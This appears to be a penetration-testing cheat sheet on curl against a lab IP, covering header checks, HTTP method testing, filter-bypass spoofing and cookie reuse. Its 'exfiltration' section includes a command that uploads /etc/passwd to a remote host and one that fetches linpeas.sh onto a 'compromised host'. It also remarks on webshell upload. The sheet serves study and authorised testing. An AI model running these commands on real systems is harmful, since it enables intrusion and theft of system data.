
# 
---

### 🔍 1. Basic Inspection & Header Analysis

Use this to see what the server is "whispering" to the client (Server version, cookies, security headers).

Bash

```
curl -I http://10.10.10.15
```

> [!NOTE] **Tactical Breakdown**
> 
> - `-I`: (Fetch headers only). Uses the `HEAD` method.
>     
> - **Why?** It lets you check for "Server: Apache/2.4.41" or "X-Powered-By: PHP/7.4" without downloading the whole page.
>     

---

### 🛠️ 2. Verbose Mode (Full Handshake)

Use this when you need to see the entire communication process, including the SSL/TLS handshake and request headers.

Bash

```
curl -v http://10.10.10.15
```

> [!TIP] **Analysis Profile**
> 
> - `-v`: Displays everything. Lines starting with `>` are your request; lines starting with `<` are the server's response.
>     
> - Essential for debugging connection issues or seeing if your headers are being sent correctly.
>     

---

### 🚀 3. Method Testing (Verb Tampering)

Web servers often support more than just `GET` and `POST`. You can use `curl` to test for dangerous methods like `PUT` or `DELETE`.

Bash

```
curl -X OPTIONS -v http://10.10.10.15
```

> [!DANGER] **Method Profile**
> 
> - `-X`: Specifies the HTTP method to use (GET, POST, PUT, DELETE, OPTIONS, TRACE).
>     
> - **Tactical Use:** If `OPTIONS` reveals `PUT` is allowed, you might be able to upload a webshell directly to the server.
>     

---

### 📂 4. POST Requests & Data Submission

Use this to test login forms or API endpoints.

Bash

```
# Simple Form Data
curl -X POST -d "username=admin&password=password123" http://10.10.10.15/login

# JSON Data for APIs
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin", "cmd":"ls"}' http://10.10.10.15/api
```

> [!SUCCESS] **Data Handling**
> 
> - `-d`: Sends the specified data in a POST request.
>     
> - `-H`: Adds a custom header (like `Content-Type` or `Authorization`).
>     

---

### 🕵️ 5. User-Agent & Header Spoofing

Some servers block "curl" or provide different content to mobile devices. Use this to bypass basic filters.

Bash

```
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)" http://10.10.10.15
```

> [!ABSTRACT] **Spoofing Logic**
> 
> - `-A`: Sets the **User-Agent**.
>     
> - `-e`: Sets the **Referer** header (useful if a page only allows access if you "came from" a specific login page).
>     
> - `-H "X-Forwarded-For: 127.0.0.1"`: Attempts to trick the server into thinking the request is local.
>     

---

### 💾 6. File Handling & Exfiltration

Used to download tools to a compromised host or upload stolen data.

Bash

```
# Download a file and save with original name
curl -O http://10.10.10.15/tools/linpeas.sh

# Download and save as a specific name
curl -o local_script.sh http://10.10.10.15/remote_script.sh

# Upload a file (if supported by the server)
curl -T /etc/passwd http://10.10.10.15/uploads/
```

---

### 🍪 7. Cookie Management

Useful for session hijacking or maintaining state during a manual audit.

Bash

```
# Save cookies to a file
curl -c cookies.txt http://10.10.10.15/login

# Use saved cookies in a request
curl -b cookies.txt http://10.10.10.15/admin
```

---

### 📂 Quick Reference Table

|Flag|Name|Purpose|
|---|---|---|
|`-s`|Silent|Hides the progress meter (good for scripting).|
|`-L`|Location|Automatically follow redirects (301/302).|
|`-k`|Insecure|Ignore SSL/TLS certificate errors (self-signed certs).|
|`--path-as-is`|Raw Path|Don't squash `/../` (Essential for Path Traversal testing).|

Export to Sheets